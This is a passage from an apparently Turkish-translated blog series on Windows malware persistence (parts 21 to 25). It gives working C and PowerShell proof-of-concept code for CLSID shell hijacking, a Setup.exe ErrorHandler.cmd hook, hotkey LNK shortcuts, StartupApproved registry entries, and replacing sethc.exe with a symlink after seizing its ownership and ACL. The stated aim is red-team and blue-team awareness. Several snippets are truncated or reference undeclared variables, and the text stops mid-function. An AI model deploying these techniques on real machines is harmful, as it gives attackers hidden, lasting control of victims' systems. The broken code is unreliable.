"SOFTWARE\\Classes\\CLSID\\{450d8fba-ad25-11d0-98a8-0800361b1103}\\shell"

// evil app
const char* exe =
"C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe";

// key
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)shell, 0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
res = RegCreateKeyExA(hkey, "open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_A
if (res == ERROR_SUCCESS) {
// update registry key value
// reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\
// {450d8fba-ad25-11d0-98a8-0800361b1103}\shell\open\command”
// /ve /t REG_SZ /d "hack.exe" /f
// RegSetValueEx(hkey, (LPCSTR)"open\\command", 0, REG_SZ,
// (unsigned char*)exe, strlen(exe));
RegSetValueEx(hkR, NULL, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
RegCloseKey(hkR);
// RegCloseKey(hkey);
}
RegCloseKey(hkey);
}
return 0;
}
Derleyip kurbanın makinesinde çalıştıralım:
.\pers.exe
reg query
"HKLM\SOFTWARE\Classes\CLSID\
{450d8fba-ad25-11d0-98a8-0800361b1103}\shell" /s
+++++++++++++++++++++++++++++++++++++++++++++++

Fakat... bende,yani Windows 10'da çalışmadı çünkü burada Başlat Menüsü kullanılıyor, ben de Masaüstünden My Documents dosyasını bulamadım.
Ayrıca, Windows 7 x86 sisteminde başka bir CLSID ile bu yöntemi denedim.
Bu yöntem My Computer klasörü için çalıştı.
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Bu yöntemi kullanan herhangi bir APT grubu veya kötü amaçlı yazılım ailesi olup olmadığını bilmiyorum.
Umarım bu gönderi, Mavi Takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve Kırmızı Takım üyelerinin cephaneliğine yeni bir silah ekler.
Malware persistence: part 1
Github’taki kaynak kod


88. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 22. Windows Kurulumu. Basit C++ örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, kötü amaçlı yazılımın kalıcılığına dair en ilginç tekniklerden biri olan Windows Kurulumu komut dosyasıyla ilgili kendi araştırmalarıma dayanmaktadır.
Kurulum Komut Dosyası
C:\WINDOWS\system32\oobe\Setup.exe, Windows işletim sisteminde bulunan bir çalıştırılabilir dosyadır. "oobe" dizini, Windows'un ilk kez kurulum sürecinde kullanıcıların geçtiği "Out Of Box Experience" (Kutudan Çıkma Deneyimi) anlamına gelir. Bu süreçte kullanıcı hesabı oluşturma, tercihler belirleme, varsayılan ayarları seçme gibi işlemler gerçekleştirilir.
+++++++++++++++++++++++++++++++++++++++++++++++

Görünüşe göre, payload’umuzu c:\WINDOWS\Setup\Scripts\ErrorHandler.cmd içine yerleştirirseniz, c:\WINDOWS\system32\oobe\Setup.exe her hata oluştuğunda bunu çalıştıracaktır.
Pratik Örnek
Haydi, pratik bir örneğe bakalım. İlk olarak, her zamanki gibi "kötü" bir uygulama oluşturalım.
Basit olması için, yine klasik meow-meow mesaj kutusu "kötü amaçlı yazılım" uygulamasını (hack.c) kullanalım:
/*
hack.c
evil app for windows persistence
author: @cocomelonc
https://cocomelonc.github.io/malware/2023/07/16/malware-pers-22.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}
Daha sonra kalıcılık için ErrorHandler.cmd dosyasını oluşturalım:
@echo off
"C:\Users\user\Desktop\research\2023-07-16-malware-pers-22\hack.exe"
Gördüğünüz gibi, mantık oldukça basit.
Demo
Her şeyi çalıştığında görelim. Öncelikle "kötü amaçlı yazılımımızı" derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Sonra ErrorHandler.cmd dosyamızı C:\Windows\Setup\Scripts konumuna taşıyalım:
+++++++++++++++++++++++++++++++++++++++++++++++

Tamam, bir sonraki adımda Setup.exe dosyasını bir hata ile çalıştırmamız gerekiyor.
Bunun en basit yolu, Setup.exe'yi herhangi bir argüman olmadan çalıştırmaktır:
.\Setup.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Process Hacker’ı açıp hack.exe dosyasının özelliklerine bakarsak:
+++++++++++++++++++++++++++++++++++++++++++++++

Ana sürecin cmd.exe (7264) olduğunu fark ederiz,
+++++++++++++++++++++++++++++++++++++++++++++++

cmd.exe’nin ebeveyn süreci ise Setup.exe (4876) olarak görünmektedir:
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, kalıcılık mantığımız mükemmel bir şekilde çalışıyor!=..=
Pratik Örnek 2: Kalıcılık Komut Dosyası
Deneyi tamamlamak adına pers.c adında bir dosya oluşturdum:
/*
pers.c
windows persistence via Windows Setup
author: @cocomelonc
https://cocomelonc.github.io/malware/2023/07/16/malware-pers-22.html
*/
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {

// create the directory if not exist
if (!CreateDirectory("C:\\WINDOWS\\Setup\\Scripts", NULL)) {
DWORD error = GetLastError();
if (error != ERROR_ALREADY_EXISTS) {
printf("failed to create directory. error: %lu\n", error);
return-1;
}
}

// open the file for writing
HANDLE hFile = CreateFile("C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd",
GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (hFile == INVALID_HANDLE_VALUE) {
printf("failed to create ErrorHandler file. error: %lu\n", GetLastError());
return-1;
}

// content to write to the file
const char* data = "@echo
off\n\"C:\\Users\\user\\Desktop\\research\\2023-07-16-malware-pers-22\\
hack.exe\"";

// write the content to the file
DWORD bytesWritten;
if (!WriteFile(hFile, data, strlen(data), &bytesWritten, NULL)) {
printf("failed to write to ErrorHandler file. error: %lu\n"
,
GetLastError());
}
// close the file handle
CloseHandle(hFile);
return 0;
}
Bu programın C:\WINDOWS altında bir dizin ve dosya oluşturmaya çalıştığı için yönetici yetkileriyle çalıştırılması gerektiğini unutmayın.
+++++++++++++++++++++++++++++++++++++++++++++++
Demo 2
Her şeyi çalıştığında görelim. Kalıcılık komut dosyamızı derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, mağdur makinede yönetici yetkileriyle çalıştıralım:
.\pers.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Benim durumumda, bunu çalıştırmadan önce ilgili klasörü sildim:
+++++++++++++++++++++++++++++++++++++++++++++++
Şimdi Setup.exe’yi tekrar çalıştırıyorum: +++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Mükemmel!=..=
Sonuç
Bu, yükleyici paketleri için yaygın bir dosya adıdır. Bu özel durumda, Windows'un kurulum ve başlatma sürecinin bir parçasıdır.İşletim sistemi yüklenirken, ayrıca sistem bileşenleri eklenirken veya değiştirirken de kullanılır.
Ancak, Setup.exe dosyasının Windows’un yasal bir parçası olmasına rağmen, kötü amaçlı yazılımlar bazen bu adı kullanarak tespit edilmekten kaçınabilir.
Ayrıca c:\WINDOWS\system32\oobe klasöründe başka dosyalar da mevcuttur:
+++++++++++++++++++++++++++++++++++++++++++++++

Bunları henüz kontrol etmedim.
Bu teknik daha önce hexacorn tarafından araştırılmıştır:
+++++++++++++++++++++++++++++++++++++++++++++++

Ben sadece C dilinde basit bir PoC kodu (pers.c) sundum.
Umarım bu yazı, mavi takım üyelerinin bu ilginç tekniğe karşı farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine yeni bir silah ekler.
Malware persistence: part 1
https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/
https://twitter.com/Hexacorn/status/1482484486994640896
Github’taki kaynak kod

89. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 23. LNK Dosyaları. Basit PowerShell Örneği

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu yazı, kötü amaçlı yazılımın kalıcılığını sağlamak için Windows LNK dosyaları kullanma üzerine yaptığım araştırmalara dayanmaktadır.
LNK
Microsoft'a göre, bir LNK dosyası, Windows'ta bir kısayol veya "bağlantı" işlevi görerek, orijinal bir dosya, klasör veya uygulamaya referans sağlar. Normal kullanıcılar için bu dosyalar, dosya organizasyonunu kolaylaştırır ve çalışma alanını düzenlemeye yardımcı olur. Ancak, saldırganlar açısından LNK dosyaları farklı bir anlam taşır. APT grupları tarafından gerçekleştirilen çeşitli belgelenmiş saldırılarda kötüye kullanılmışlardır ve bildiğim kadarıyla oltalama, kalıcılık sağlama ve payload’ları çalıştırma gibi faaliyetler için hâlâ geçerli bir seçenek olmaya devam etmektedir.
Windows kısayollarının belirli bir tuş kombinasyonu ile çalıştırılabilecek şekilde kaydedilebileceğini biliyor muydunuz? İşte bu, bu yöntemin kalıcılık sağlamak için temel hilesidir.
Pratik Örnek
Diyelim ki bir kötü amaçlı yazılımımız var. Her zamanki gibi, meow-meow mesaj kutusu açan hack.c uygulaması:

/*
hack.c
evil app for windows persistence
author: @cocomelonc
https://cocomelonc.github.io/malware/2023/12/10/malware-pers-23.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}
Daha sonra aşağıdaki özelliklere sahip LNK dosyasını oluşturmak için bir PowerShell betiği yazalım:
# Define the path for the shortcut on the desktop
$shortcutPath = "$([Environment]::GetFolderPath('Desktop'))\Meow.lnk"

# Create a WScript Shell object
$wshell = New-Object -ComObject Wscript.Shell

# Create a shortcut object
$shortcut = $wshell.CreateShortcut($shortcutPath)

# Set the icon location for the shortcut
$shortcut.IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"

# Set the target path and arguments for the shortcut
$shortcut.TargetPath = "Z:\2023-12-10-malware-pers-23\hack.exe"
$shortcut.Arguments = ""

# Set the working directory for the shortcut
$shortcut.WorkingDirectory = "Z:\2023-12-10-malware-pers-23"

# Set a hotkey for the shortcut (e.g., CTRL+W)
$shortcut.HotKey = "CTRL+W"

# Set a description for the shortcut
$shortcut.Description = "Not malicious, meow-meow malware"

# Set the window style for the shortcut (7 = Minimized window)
$shortcut.WindowStyle = 7

# Save the shortcut
$shortcut.Save()

# Optionally make the link invisible by adding 'Hidden' attribute
# (Get-Item $shortcutPath).Attributes += 'Hidden'
Gördüğünüz gibi, mantık oldukça basittir. CTRL+W tuş kombinasyonuna sahip bir masaüstü kısayolu oluşturuyoruz. Tabii ki, gerçek saldırı senaryolarında CTRL+C, CTRL+V veya CTRL+P gibi daha yaygın tuş kombinasyonları da kullanılabilir.
Örneğin, Paint uygulaması için bir kısayol oluşturduğunuzda, herhangi bir kısayol tuşu atanmamış olur:
+++++++++++++++++++++++++++++++++++++++++++++++

Windows Explorer, kısayol desteğini yalnızca CTRL+ALT ile başlayan komutlarla sınırlar.
Ek tuş kombinasyonları yalnızca COM nesneleri aracılığıyla programlı olarak ayarlanabilir.
Demo
Her şeyi uygulamada görelim. Öncelikle, kötü amaçlı yazılımımızı derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++
Doğruluğunu kontrol etmek için şunu çalıştırıyoruz:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra, kalıcılığı sağlamak için PowerShell betiğimizi çalıştırıyoruz:
Get-Content pers.ps1 | PowerShell.exe -noprofile –
+++++++++++++++++++++++++++++++++++++++++++++++
Sonuç olarak, Meow LNK dosyası başarıyla oluşturuldu:
Özelliklerini kontrol ettiğimizde her şeyin düzgün çalıştığını görebiliriz:
+++++++++++++++++++++++++++++++++++++++++++++++
Son olarak, dosyayı çalıştırıyoruz ve CTRL+W tuş kombinasyonunu kullanarak tetiklemeye çalışıyoruz:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey beklendiği gibi mükemmel bir şekilde çalıştı =..= :)
Bu teknik, APT28, APT29, Kimsuky gibi APT grupları ve Emotet gibi kötü amaçlı yazılımlar tarafından sahada kullanılmaktadır. Dürüst olmak gerekirse, bu yöntem kurbanları kandırmak için son derece elverişli olduğu için yaygın olarak kullanılmakta ve hızla yayılmaktadır.
Umarım bu yazı, mavi takım için farkındalık yaratır ve kırmızı takım üyelerinin araç setine yeni bir teknik ekler.
Bu tekniği bana hatırlattığı için arkadaşım ve meslektaşım Anton Kuznetsov’a teşekkür ederim. Kendisinin yaptığı en harika sunumlardan birinde bu yöntemi detaylandırmıştı.
ATT&CK MITRE: T1204.001
APT28
APT29
Kimsuky
Emotet
MSDN: Shell Link (.LNK) Binary File Format
Malware persistence: part 1
Github’taki kaynak kod


90. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 24. StartupApproved. Basit C örneği.


﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, kötü amaçlı yazılım kalıcılığına dair ilginç tekniklerden birine, yani StartupApproved Kayıt Defteri anahtarı üzerinden yapılan kalıcılık yöntemine dair kendi araştırmalarıma dayanmaktadır.
StartupApproved
Bu serinin ilk gönderisinde, Kayıt Defteri'nin Run anahtarları aracılığıyla yapılan en popüler ve klasik tekniklerden birinden bahsetmiştim.


Standart "başlangıç" işlemi (Windows Gezgini tarafından kontrol edilen Run ve RunOnce anahtarları, Başlangıç klasörü vb.) tamamlandıktan sonra userinit.exe tarafından kullanılan ve pek yaygın olmayan bir Kayıt Defteri girdisi, aşağıdaki konumda bulunmaktadır:
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
Görünüşe göre, bu anahtar Windows Görev Yöneticisi'nin Başlangıç sekmesi aracılığıyla girişler etkinleştirildiğinde veya devre dışı bırakıldığında doldurulmaktadır:
+++++++++++++++++++++++++++++++++++++++++++++++
İyi haber şu ki, bu kayıt defteri yolunu kalıcılık için kullanabiliriz.
Pratik Örnek
Öncelikle, aşağıdaki komutla Kayıt Defteri anahtarlarını kontrol edin:
reg query
"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved"
/s

+++++++++++++++++++++++++++++++++++++++++++++++
Bir sonraki adımda, her zamanki gibi "kötü amaçlı" uygulamamızı oluşturuyoruz (hack.c):
/*
hack.c
simple DLL messagebox
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {
switch (nReason) {
case DLL_PROCESS_ATTACH:
MessageBox(
NULL,
"Meow-meow!",
"=^..^=",
MB_OK
);
break;
case DLL_PROCESS_DETACH:
	break;
case DLL_THREAD_ATTACH:
	break;
case DLL_THREAD_DETACH:
	break;
}
return TRUE;
}
Her zamanki gibi, sadece bir meow-meow mesaj kutusu.
Daha sonra, HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved kayıt defteri anahtarımızı aşağıdaki şekilde değiştiriyoruz (pers.c):
/*
pers.c
windows persistence
via StartupApproved
author: @cocomelonc
https://cocomelonc.github.io/malware/2024/03/12/malware-pers-24.html
*/
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00};

const char* path =
"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\

StartupApproved\\Run";
const char* evil = "Z:\\2024-03-12-malware-pers-24\\hack.dll";

LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE,
&hkey);
printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
"successfully open registry key :)\n");

res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
"successfully set registry value :)\n");

// close the registry key
RegCloseKey(hkey);
return 0;
}
Görebileceğiniz gibi, PoC (kanıt niteliğinde konsept) mantığımız oldukça basit - kayıt defteri girdisinin değerini 0x02 0x00... şeklinde bir ikili değere ayarlıyoruz.
Demo
Hadi her şeyi çalışırken görelim. Öncelikle, "kötü amaçlı" DLL'imizi derleyelim:
x86_64-w64-mingw32-g++ -shared -o hack.dll hack.c -fpermissive
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra, PoC'umuzu derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Son olarak, bunu kurbanın makinesinde çalıştıralım. Benim durumumda, Windows 10 x64 v1903 sanal makinemde şu şekilde görünüyor:
.\pers.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, Kayıt Defteri'ni tekrar kontrol ettim:
reg query
"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved"
/s
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra çıkış yapıp tekrar giriş yaptım:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Ancak beklenmedik bir şekilde benim için çalışmadı…
Daha sonra sadece giriş adını güncelledim:
+++++++++++++++++++++++++++++++++++++++++++++++

Çıkış yapıp tekrar giriş yaptım, biraz bekledim… ve mükemmel şekilde çalıştı…
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Bu yüzden betiğimde bir satırı güncelledim:
/*
pers.c
windows persistence
via StartupApproved
author: @cocomelonc
https://cocomelonc.github.io/malware/2024/03/12/malware-pers-24.html
*/
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00};

const char* path =
"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\
StartupApproved\\Run";
const char* evil = "C:\\temp\\hack.dll";

LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE,
&hkey);
printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
"successfully open registry key :)\n");

res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
"successfully set registry value :)\n");

// close the registry key
RegCloseKey(hkey);
return 0;
}
Fakat burada bir püf noktası var. Bu özelliği test ettiğim bazı durumlarda, Skype gibi uygulamalar benim için otomatik olarak başlatıldı:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey beklendiği gibi mükemmel çalıştı! =..= :)


Bu teknik, APT28, APT29, Kimsuky ve APT33 gibi APT grupları tarafından aktif olarak kullanılmaktadır.
Dürüst olmak gerekirse, bu yöntem kurbanları kandırmadaki aşırı kullanışlılığı nedeniyle oldukça yaygın ve popülerdir.
Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyeleri için yeni bir silah ekler.
ATT&CK MITRE: T1547.001
Malware persistence: part 1
APT28
APT29
Kimsuky
APT33
Github’taki kaynak kod


91. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 25. Meşru dosyadan kötü amaçlı dosyaya sembolik bağlantı oluşturma. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Önceki gönderilerden birinde, Erişilebilirlik özellikleri aracılığıyla popüler kalıcılık tekniklerinden bahsetmiştim. APT3, APT29 ve APT41 gibi APT grupları, bu özelliği bilgisayarlara saldırmak için kullandı.
Bu gönderide, aynı tekniği farklı bir mantıkla gösteriyorum: basitçe meşru bir uygulamadan kötü amaçlı bir dosyaya sembolik bağlantı oluşturma.
Sembolik Bağlantı Oluşturma: Erişilebilirlik Özellikleri
Saldırganlar tarafından kalıcılık sağlamak için kullanılan iyi bilinen bir yöntem, Windows Erişilebilirlik özelliklerini değiştirmek veya yönlendirmek için sembolik bağlantılar (symlink) oluşturmaktır. Bu yöntem, yalnızca ikili dosyaları değiştirmekten daha karmaşıktır çünkü geçerli bir sistem dosyasından veya özelliğinden kötü amaçlı bir dosyaya sembolik bir bağlantı oluşturmayı içerir. Sistem veya kullanıcı orijinal dosyaya veya özelliğe erişmeye çalıştığında, farkında olmadan kötü amaçlı bir dosyaya yönlendirilir.
Pratik Örnek
Mantık oldukça basit görünebilir:
#include <windows.h>
#include <stdio.h>
int main() {
// path to the legitimate binary (e.g., Sticky Keys)
const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
// path to the malicious binary
const char* meowApp = "Z:\\hack.exe";

// delete the original file (requires administrative privileges)
if (!DeleteFileA((LPCSTR)legitApp)) {
printf("error deleting original file: %d\n", GetLastError());
return 1;
}
printf("original file deleted successfully\n");
CloseHandle(hFile);

// create the symbolic link
if (!CreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
printf("error creating symlink: %d\n", GetLastError());
return 1;
}
printf("symlink to meow created successfully =^..^=\n");
return 0;
}
ancak gerçekte her şey biraz daha karmaşıktır.
Diyelim ki elimizde bir “kötü amaçlı yazılım” var:
/*
* hack.c
* "malware" for symlink
* persistence trick
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/08/malware-pers-25.html
*/

#include <windows.h>
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}
Ve bir sembolik bağlantı oluşturmak istiyorum, hedef meşru uygulama şu olsun:
const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
Öncelikle, izinlere ihtiyacımız var:
SE_TAKE_OWNERSHIP_NAME
SE_DEBUG_NAME
SE_RESTORE_NAME
SE_BACKUP_NAME
Bunun için setPrivilege fonksiyonunu kullanıyoruz:
// set privilege
BOOL setPrivilege(LPCTSTR priv) {
HANDLE token;
TOKEN_PRIVILEGES tp;
LUID luid;
BOOL res = TRUE;

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
if (!OpenProcessToken(GetCurrentProcess(),
TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
printf(res ? "successfully enable %s :)\n" :
"failed to enable %s :(\n", priv);
return res;
}
Gördüğünüz gibi, bu fonksiyon geçerli işlem için belirtilen bir ayrıcalığı etkinleştirmek için kullanılır.
Daha sonra, gerekli erişim izinleri (WRITE_OWNER ve WRITE_DAC) ile meşru ikili dosyayı açıyoruz:
HANDLE hFile = CreateFileA((LPCSTR)legitApp, WRITE_OWNER | WRITE_DAC, FILE_SHARE_READ, NULL,
Ardından, belirteç bilgilerini alıyoruz:
// obtain the SID for the current user
HANDLE hToken;
DWORD dwSize = 0;
PTOKEN_USER pTokenUser = NULL;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
printf("Failed to open process token: %d\n", GetLastError());
CloseHandle(hFile);
return 1;
}
printf("open process token: ok\n");

// get the required size for the token information
GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
pTokenUser = (PTOKEN_USER)malloc(dwSize);
if (pTokenUser == NULL) {
printf("failed to allocate memory for token information\n");
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("allocate memory token info: ok\n");

// get the token information
if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
printf("failed to get token information: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("get token info: ok\n");
Sonraki adımda, meşru ikili dosyanın sahipliğini geçerli kullanıcı olarak değiştirmemiz gerekiyor:
// initialize a security descriptor
SECURITY_DESCRIPTOR sd;
if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
printf("failed to initialize security descriptor: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("init security descriptor: ok\n");

// set the owner in the security descriptor
if (!SetSecurityDescriptorOwner(&sd, pTokenUser->User.Sid, FALSE)) {
printf("failed to set security descriptor owner: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting security descriptor owner: ok\n");

// apply the security descriptor to the file
if (!SetFileSecurityA(legitApp, OWNER_SECURITY_INFORMATION, &sd)) {
printf("error setting file ownership: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting file ownership: ok\n");
InitializeSecurityDescriptor – yeni bir güvenlik tanımlayıcısı başlatır.
SetSecurityDescriptorOwner – güvenlik tanımlayıcısındaki sahibi, geçerli kullanıcının SID'si (Güvenlik Tanımlayıcısı) olarak ayarlar.
SetFileSecurityA – sahipliği değiştirmek için güvenlik tanımlayıcısını meşru ikili dosyaya uygular.
Daha sonra, dosyaya yeni ACL uygulanır:
// set full control for the current user
EXPLICIT_ACCESS ea;
PACL pNewAcl = NULL;

ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
ea.grfAccessPermissions = GENERIC_ALL;
ea.grfAccessMode = SET_ACCESS;
ea.grfInheritance = NO_INHERITANCE;
ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
ea.Trustee.ptstrName = (LPSTR)pTokenUser->User.Sid;

if (SetEntriesInAcl(1, &ea, NULL, &pNewAcl) != ERROR_SUCCESS) {
printf("error setting new ACL: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting new ACL: ok\n");

if (SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION,
NULL, NULL, pNewAcl, NULL) != ERROR_SUCCESS) {
printf("error setting security info: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
LocalFree(pNewAcl);
return 1;
}
printf("setting security info: ok\n");

free(pTokenUser);
CloseHandle(hToken);
LocalFree(pNewAcl);

Son olarak, orijinal dosyayı silin ve sembolik bağlantıyı ayarlayın:

// delete the original file (requires administrative privileges)
if (!DeleteFileA((LPCSTR)legitApp)) {
printf("error deleting original file: %d\n", GetLastError());
return 1;
}
printf("original file deleted successfully\n");
CloseHandle(hFile);

HMODULE kernel = GetModuleHandle("kernel32.dll");
pCreateSymbolicLinkA = (BOOLEAN(WINAPI *)(LPCSTR, LPCSTR, DWORD))
GetProcAddress(kernel, (LPCSTR)"CreateSymbolicLinkA");

// create the symbolic link
if (!pCreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
printf("error creating symlink: %d\n", GetLastError());
return 1;
}
printf("symlink to meow created successfully =^..^=\n");
return 0;
Gördüğünüz gibi, bu oldukça karmaşıktır. Bu PoC, Windows API'yi kullanarak ayrıcalıkları ayarlama, dosya sahipliğini değiştirme, ACL’leri ayarlama, dosya silme ve sembolik bağlantı oluşturma işlemlerini nasıl gerçekleştireceğimizi göstermektedir.
Sistem32 klasöründen orijinal dosyayı hemen silmeye çalışırsanız, "erişim reddedildi" hatası alırsınız.
Ayrıca, mevcut kullanıcı için SID elde etme ve ayarlama işlemleri yanlışsa, "hata 1337 geçersiz sahip" gibi bir hata alabilirsiniz.
Nihai kaynak kodu şu şekilde görünmektedir  pers.c:
/*
* pers.c
* symlink persistence trick
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/08/malware-pers-25.html
*/
#include <windows.h>
#include <stdio.h>
#include <aclapi.h> // for OWNER_SECURITY_INFORMATION
#include <sddl.h> // for ConvertStringSidToSid ???

BOOLEAN (WINAPI * pCreateSymbolicLinkA)(
LPCSTR lpSymlinkFileName,
LPCSTR lpTargetFileName,
DWORD dwFlags
);

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
HANDLE token;
TOKEN_PRIVILEGES tp;
LUID luid;
BOOL res = TRUE;

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

